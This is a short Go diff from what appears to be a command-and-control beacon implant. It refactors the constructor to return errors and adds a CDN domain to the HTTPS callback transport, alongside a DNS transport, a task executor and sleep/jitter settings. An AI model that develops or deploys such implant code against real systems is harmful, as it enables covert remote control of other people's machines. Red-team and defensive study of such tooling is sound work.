@@ -27,13 +27,17 @@ type Beacon struct {
 	pendingResults []*pb.TaskResult // buffered results from failed sends
 }
 
-func New(cfg *Config) *Beacon {
+func New(cfg *Config) (*Beacon, error) {
 	var t transport.Transport
 	switch cfg.TransportType {
 	case "dns":
 		t = transport.NewDNSTransport(cfg.DNSDomain, cfg.DNSServer)
 	default:
-		t = transport.NewHTTPSTransport(cfg.Callback, cfg.CACertPEM)
+		ht, err := transport.NewHTTPSTransport(cfg.Callback, cfg.CACertPEM, cfg.CDNDomain)
+		if err != nil {
+			return nil, fmt.Errorf("init HTTPS transport: %w", err)
+		}
+		t = ht
 	}
 
 	return &Beacon{
@@ -42,7 +46,7 @@ func New(cfg *Config) *Beacon {
 		executor:  tasks.NewExecutor(plugin.Global),
 		sleep:     cfg.Sleep,
 		jitterPct: cfg.JitterPct,
-	}
+	}, nil
 }
 
 func (b *Beacon) Run() {
